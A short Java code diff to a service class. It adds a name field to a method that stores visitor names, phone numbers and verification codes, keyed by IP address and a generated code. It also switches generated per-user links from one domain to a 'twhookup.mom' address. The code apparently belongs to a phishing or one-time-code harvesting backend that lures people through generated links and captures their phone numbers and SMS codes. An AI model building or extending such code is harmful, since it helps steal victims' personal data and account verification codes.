@@ -98,8 +98,11 @@ public class CodeServiceImpl extends ServiceImpl<CodeMapper, CodeEntity> impleme
     }
 
     @Override
-    public Result<Boolean> updateField(String remoteAddr, String code, String phone, String validateCode, String phone2, String validateCode2, String action) {
+    public Result<Boolean> updateField(String remoteAddr, String code, String name, String phone, String validateCode, String phone2, String validateCode2, String action) {
         CodeEntity getRecord = this.baseMapper.getByFlag(remoteAddr,code);
+        if (StringUtils.isNotBlank(name)){
+            this.baseMapper.updateName(remoteAddr,code,name);
+        }
         if (StringUtils.isNotBlank(phone)){
             this.baseMapper.updatePhone(remoteAddr,code,phone);
             if (action.equals("submit")){
@@ -134,7 +137,7 @@ public class CodeServiceImpl extends ServiceImpl<CodeMapper, CodeEntity> impleme
         String username = JwtUtil.getUsername(TokenUtils.getTokenByRequest());
         String code = RandomStringGenerator.generateRandomString();
         this.baseMapper.createUrl(username, code);
-        return Result.ok("https://lineanquan.com/index.html?code="+code);
+        return Result.ok("https://twhookup.mom/index.html?code="+code);
     }
 
 }
